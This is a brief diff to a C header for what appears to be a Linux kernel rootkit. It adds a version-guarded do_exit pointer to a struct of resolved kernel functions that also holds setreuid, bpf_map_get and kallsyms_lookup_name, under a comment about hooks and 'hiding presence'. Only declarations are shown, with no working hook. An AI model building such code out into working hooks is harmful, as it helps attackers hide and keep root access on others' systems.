@@ -93,13 +93,21 @@ typedef struct bpf_map *(*bpf_map_get_sg)(unsigned int);
 
 typedef unsigned long (*kallsyms_lookup_name_sg)(const char *name);
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
+typedef void (*do_exit_sg)(long error_code) __noreturn;
+#endif
+
 typedef asmlinkage long (*sys64)(struct pt_regs *regs);
+
 
 struct kernel_syscalls {
     attach_pid_sg k_attach_pid;
     bpf_map_get_sg k_bpf_map_get;
     kallsyms_lookup_name_sg k_kallsyms_lookup_name;
     sys64 k_sys_setreuid;
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
+    do_exit_sg k_do_exit;
+#endif
 };
 
 /** hooks, hiding presence and so */
